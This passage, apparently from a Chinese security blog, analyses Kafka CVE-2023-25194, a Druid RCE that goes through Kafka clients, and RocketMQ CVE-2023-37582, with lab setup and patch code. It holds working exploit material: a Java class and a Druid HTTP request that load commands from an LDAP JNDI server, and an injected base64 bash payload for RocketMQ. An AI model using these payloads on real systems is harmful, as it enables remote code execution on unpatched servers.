java.util.Properties;</span><br><span class="line"></span><br><span class="line">public class EXP &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Properties properties = new Properties();</span><br><span class="line">        properties.put(&quot;bootstrap.servers&quot;, &quot;127.0.0.1:1234&quot;);</span><br><span class="line">        properties.put(&quot;key.deserializer&quot;, &quot;org.apache.kafka.common.serialization.StringDeserializer&quot;);</span><br><span class="line">        properties.put(&quot;value.deserializer&quot;,&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;);</span><br><span class="line"></span><br><span class="line">        properties.put(&quot;sasl.mechanism&quot;, &quot;PLAIN&quot;);</span><br><span class="line">        properties.put(&quot;security.protocol&quot;, &quot;SASL_SSL&quot;);</span><br><span class="line">        properties.put(&quot;sasl.jaas.config&quot;, &quot;com.sun.security.auth.module.JndiLoginModule &quot; +</span><br><span class="line">                &quot;required &quot; +</span><br><span class="line">                &quot;user.provider.url=\&quot;ldap://124.222.21.138:1389/Basic/Command/Base64/Q2FsYw==\&quot; &quot; +</span><br><span class="line">                &quot;useFirstPass=\&quot;true\&quot; &quot; +</span><br><span class="line">                &quot;group.provider.url=\&quot;xxx\&quot;;&quot;);</span><br><span class="line"></span><br><span class="line">        KafkaConsumer&lt;String, String&gt; kafkaConsumer = new KafkaConsumer&lt;&gt;(properties);</span><br><span class="line">        kafkaConsumer.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/EXP.png" class><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>前面有非常多的数据处理与赋值，这里就跳过了，直接看 <code>org.apache.kafka.clients.consumer.KafkaConsumer</code> 类的第 177 行 <code>ClientUtils.createChannelBuilder()</code>，跟进。</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/createChannelBuilder.png" class><p>继续跟进，这里会先判断 SASL 模式是否开启，只有开启了才会往下跟进到 <code>create()</code> 方法</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/SASL_SSL.png" class><p>跟进 <code>create()</code> 方法，做完客户端的判断和安全协议的判断之后，调用了 <code>loadClientContext()</code> 方法，跟进，发现其中还是加载了一些配置。</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/loadClientContext.png" class><p>跳出来，跟进 <code>((ChannelBuilder)channelBuilder).configure(configs)</code> 方法，最后跟到 <code>org.apache.kafka.common.security.authenticator.LoginManager</code> 的构造函数。</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/LoginManager.png" class><p>跟进 <code>login()</code> 方法，此处 <code>new LoginContext()</code>，随后调用 <code>login()</code> 方法，跟进</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/loginContext.png" class><p>这里会调用 <code>JndiLoginModule</code> 的 <code>initialize()</code> 方法</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/moduleStack.png" class><p>初始化完成之后，此处调用 <code>JndiLoginModule</code> 的 <code>login()</code> 方法，最后到 <code>JndiLoginModule</code> 的 <code>attemptAuthentication()</code> 方法，完成 Jndi 注入。</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/down.png" class><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在 3.4.0 版本中, 官方的修复方式是增加了对 <code>JndiLoginModule</code> 的黑名单</p><p><code>org.apache.kafka.common.security.JaasContext#throwIfLoginModuleIsNotAllowed</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">throwIfLoginModuleIsNotAllowed</span><span class="params">(AppConfigurationEntry appConfigurationEntry)</span> &#123;</span><br><span class="line">    Set&lt;String&gt; disallowedLoginModuleList = (Set)Arrays.stream(System.getProperty(<span class="string">&quot;org.apache.kafka.disallowed.login.modules&quot;</span>, <span class="string">&quot;com.sun.security.auth.module.JndiLoginModule&quot;</span>).split(<span class="string">&quot;,&quot;</span>)).map(String::trim).collect(Collectors.toSet());</span><br><span class="line">    <span class="type">String</span> <span class="variable">loginModuleName</span> <span class="operator">=</span> appConfigurationEntry.getLoginModuleName().trim();</span><br><span class="line">    <span class="keyword">if</span> (disallowedLoginModuleList.contains(loginModuleName)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(loginModuleName + <span class="string">&quot; is not allowed. Update System property &#x27;&quot;</span> + <span class="string">&quot;org.apache.kafka.disallowed.login.modules&quot;</span> + <span class="string">&quot;&#x27; to allow &quot;</span> + loginModuleName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Apache-Druid-RCE-via-Kafka-Clients"><a href="#Apache-Druid-RCE-via-Kafka-Clients" class="headerlink" title="Apache Druid RCE via Kafka Clients"></a>Apache Druid RCE via Kafka Clients</h2><p>影响版本：Apache Druid &lt;&#x3D; 25.0.0</p><p>Apache Druid 是一个实时分析型数据库, 它支持从 Kafka 中导入数据 (Consumer) , 因为目前最新版本的 Apache Druid 25.0.0 所用 <code>kafka-clients</code> 依赖的版本仍然是 3.3.1, 即存在漏洞的版本, 所以如果目标 Druid 存在未授权访问 (默认配置无身份认证), 则可以通过这种方式实现 RCE</p><p>有意思的是, Druid 包含了 <code>commons-beanutils:1.9.4</code> 依赖, 所以即使在高版本 JDK 的情况下也能通过 LDAP JNDI 打反序列化 payload 实现 RCE</p><ul><li>漏洞 UI 处触发点：Druid Web Console - Load data - Apache Kafka</li></ul><p>在这里可以加载 Kafka 的 Data，其中可以修改配置项 <code>sasl.jaas.config</code>，由此构造 Payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://124.222.21.138:8888/druid/indexer/v1/sampler?for=connect</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.222.21.138:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>916</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://124.222.21.138:8888</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://124.222.21.138:8888/unified-console.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5,zh-TW;q=0.4,no;q=0.3,ko;q=0.2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-swift">&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,<span class="string">&quot;ioConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,<span class="string">&quot;consumerProperties&quot;</span>:&#123;<span class="string">&quot;bootstrap.servers&quot;</span>:<span class="string">&quot;127.0.0.1:1234&quot;</span>,</span></span><br><span class="line"><span class="language-swift"><span class="string">&quot;sasl.mechanism&quot;</span>:<span class="string">&quot;SCRAM-SHA-256&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;security.protocol&quot;</span>:<span class="string">&quot;SASL_SSL&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;sasl.jaas.config&quot;</span>:<span class="string">&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=<span class="subst">\&quot;</span>ldap://124.222.21.138:1389/Basic/Command/base64/aWQgPiAvdG1wL3N1Y2Nlc3M=<span class="subst">\&quot;</span> useFirstPass=<span class="subst">\&quot;</span>true<span class="subst">\&quot;</span> serviceName=<span class="subst">\&quot;</span>x<span class="subst">\&quot;</span> debug=<span class="subst">\&quot;</span>true<span class="subst">\&quot;</span> group.provider.url=<span class="subst">\&quot;</span>xxx<span class="subst">\&quot;</span>;&quot;</span></span></span><br><span class="line"><span class="language-swift">&#125;,<span class="string">&quot;topic&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;useEarliestOffset&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;inputFormat&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,<span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;([<span class="subst">\\</span>s<span class="subst">\\</span>S]*)&quot;</span>,<span class="string">&quot;listDelimiter&quot;</span>:<span class="string">&quot;56616469-6de2-9da4-efb8-8f416e6e6965&quot;</span>,<span class="string">&quot;columns&quot;</span>:[<span class="string">&quot;raw&quot;</span>]&#125;&#125;,<span class="string">&quot;dataSchema&quot;</span>:&#123;<span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,<span class="string">&quot;timestampSpec&quot;</span>:&#123;<span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,<span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span>&#125;,<span class="string">&quot;dimensionsSpec&quot;</span>:&#123;&#125;,<span class="string">&quot;granularitySpec&quot;</span>:&#123;<span class="string">&quot;rollup&quot;</span>:<span class="literal">false</span>&#125;&#125;,<span class="string">&quot;tuningConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>&#125;&#125;,<span class="string">&quot;samplerConfig&quot;</span>:&#123;<span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,<span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/druidAttack.png" class><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/success-25194.png" class><p>在 <code>druid-kafka-indexing-service</code> 这个 extension 中可以看到实例化 KafkaConsumer 的过程</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/KafkaRecordSupplier.png" class><p>而上面第 286 行的 <code>addConsumerPropertiesFromConfig()</code> 正是进行了动态修改配置</p><p>Apache Druid 26.0.0 更新了 kafka 依赖的版本</p><p><a class="link" href="https://github.com/apache/druid/blob/26.0.0/pom.xml#L79">https://github.com/apache/druid/blob/26.0.0/pom.xml#L79<i class="fas fa-external-link-alt"></i></a></p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/druidNewVersion.png" class>]]></content>
    
    
    <summary type="html">CVE-2023-25194 漏洞分析</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-37582 Apache RocketMQ RCE 漏洞分析</title>
    <link href="https://drun1baby.github.io/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-11-21T03:42:50.000Z</published>
    <updated>2023-11-27T01:51:33.370Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-37582-漏洞分析"><a href="#CVE-2023-37582-漏洞分析" class="headerlink" title="CVE-2023-37582 漏洞分析"></a>CVE-2023-37582 漏洞分析</h1><p>调试端口</p><p>10011 broker<br>10012 namsrv</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>RocketMQ 是一个开源的分布式消息中间件，NameServer 为 Producer 和 Consumer 节点提供路由信息的组件。</p><p>由于 CVE-2023-33246 的补丁中并未对 DefaultRequestProcessor#updateConfig 方法中的 configStorePath 属性值进行过滤，当 NameServer 地址暴露在公网并且缺乏权限校验，未经授权的攻击者可 payload 注入到 configStorePath 中，调用 NameServer 的更新配置函数将恶意文件上传到 RocketMQ 服务器中实现远程代码执行。</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Apache RocketMQ &lt;&#x3D; 5.1.1<br>Apache RocketMQ &lt;&#x3D; 4.9.6</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>先 wget 需要的东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://archive.apache.org/dist/rocketmq/5.1.1/rocketmq-all-5.1.1-bin-release.zip</span><br></pre></td></tr></table></figure><p>然后 <strong>Dockerfile</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>u342-jdk</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.aliyun.com/g&#x27;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt install vim netcat iputils-ping net-tools cron -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    wget https://mirrors.tuna.tsinghua.edu.cn/apache/rocketmq/5.1.1/rocketmq-all-5.1.1-bin-release.zip &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    unzip rocketmq-all-5.1.1-bin-release.zip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /rocketmq-all-5.1.1-bin-release/bin/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>docker-compose.yml</strong></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">namesrv:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqnamesrv</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9876</span><span class="string">:9876</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10012</span><span class="string">:10010</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT=-Xdebug</span> <span class="string">-Xrunjdwp:transport=dt_socket,address=10010,server=y,suspend=n</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">mqnamesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">broker:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqbroker</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10909</span><span class="string">:10909</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10911</span><span class="string">:10911</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10912</span><span class="string">:10912</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10011</span><span class="string">:10010</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT=-Xdebug</span> <span class="string">-Xrunjdwp:transport=dt_socket,address=10010,server=y,suspend=n</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">mqbroker</span> <span class="string">-n</span> <span class="string">namesrv:9876</span> <span class="string">-c</span> <span class="string">../conf/broker.conf</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">dashboard:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">apacherocketmq/rocketmq-dashboard</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqdashboard</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:8080</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">JAVA_OPTS:</span> <span class="string">&quot;-Drocketmq.namesrv.addr=namesrv:9876&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">test:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmq_test</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">tail</span> <span class="string">-f</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实这里用之前 CVE-2023-33246 的环境也可以，但是最好是用 4.x 的，下载环境需要一段时间</p><h2 id="漏洞复现与分析"><a href="#漏洞复现与分析" class="headerlink" title="漏洞复现与分析"></a>漏洞复现与分析</h2><p>这个漏洞本质上是 CVE-2023-33246 的补丁绕过，或者也可以说根本没有做什么防护，先来看 diff</p><p><a class="link" href="https://github.com/apache/rocketmq/commit/fb1c67d536c95ec7bd5904e61b9d97c4c2ee5a3d">https://github.com/apache/rocketmq/commit/fb1c67d536c95ec7bd5904e61b9d97c4c2ee5a3d<i class="fas fa-external-link-alt"></i></a></p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/diff.png" class><p>很简单的 diff，只是把 <code>configStorePathName</code> 改成了 <code>configStorePath</code></p><p>上一次在分析 CVE-2023-33246 的时候，我抓过一个流量包，其中的内容就是在 CVE-2023-33246 中的 rocketmq 协议。</p><p>拿其中的一段 TCP 流量出来说</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/TCP.png" class><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">25</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">401</span><span class="punctuation">&#125;</span>filterServerNums=<span class="number">1</span></span><br><span class="line">rocketmqHome=-c <span class="punctuation">&#123;</span>echo<span class="punctuation">,</span>dG91Y2ggL3RtcC9mbGFn<span class="punctuation">&#125;</span>|<span class="punctuation">&#123;</span>base64<span class="punctuation">,</span>-d<span class="punctuation">&#125;</span>|bash -c</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">435</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">26</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">401</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;extFields&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="string">&quot;&#123;\&quot;counter\&quot;:1,\&quot;stateVersion\&quot;:0,\&quot;timestamp\&quot;:1689312950437&#125;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">435</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>很显然，目前提取出来的部分应该是 TCP 请求中的一段参数，下个断点分析一下这一段通信过程</p><h3 id="通信过程分析"><a href="#通信过程分析" class="headerlink" title="通信过程分析"></a>通信过程分析</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...c..._<span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">435</span><span class="punctuation">&#125;</span>...d...</span><br></pre></td></tr></table></figure><p>协议主要包含四部分  协议总长度+ json 长度+ json + body，前后两段的 c、d 对应的是 ascii 码</p><p>在这一段 json 数据包当中，比较引人注目的是 <code>&quot;code&quot;:25</code>，不同的 code 代表了不同的业务，根据数据包当中的 code 字段，程序会进行不同的业务处理，处理业务在 <code>org.apache.rocketmq.broker.processor.AdminBrokerProcessor#processRequest</code> 方法中</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/RequestCodeStatus.png" class><p>其中代码块 <code>case RequestCode.UPDATEE_BROKER_CONFIG</code> 提到一个类 <code>RequestCode</code>，后续会用到</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/RequestCode.png" class><p>跟进 <code>this.updateBrokerConfig()</code> 方法，方法中先将 body 字段的值提取出来，封装进 <code>Properties</code> 类当中，封装完的结果如图</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/properties.png" class><p>往下，跟进 <code>this.brokerController.getConfiguration().update()</code> 方法，到第 187 行，循环遍历所有的配置，并根据对应类，更新配置</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/configObject.png" class><p>可以看到，经过这一步之后，里面的值已经是被更新了</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/update.png" class><p>程序接着调用 <code>persist()</code> 方法， <code>persist()</code> 方法做的业务其实是将 <code>configObjectList</code> 写入进对应的配置文件当中。</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/persist.png" class><p>很清晰的是，程序会将配置写入到两个文件中，分别是 <code>filename</code> 和 <code>filename.bak</code>，其中 <code>filename</code> 的值对应的是 <code>configStorePath</code>，也是 CVE-2023-33246 的黑名单字段</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/string2file.png" class><p>在整段程序执行结束后可以发现 <code>../conf/broker.conf</code> 的内容改变了，且 rocketHome 已经被修改为了我们的输入</p><h3 id="构造-EXP"><a href="#构造-EXP" class="headerlink" title="构造 EXP"></a>构造 EXP</h3><p>既然可以对文件进行修改与写入，根据漏洞描述，修改存储路径为计划任务路径写入 crontab 造成 RCE 即可，因为要写入 crontab，所以涉及到权限问题，其中初始化的 kvConfigPath、configStorePath 带有当前用户，而 kvConfigPath 处于黑名单中，configStorePath 还未被过滤</p><img 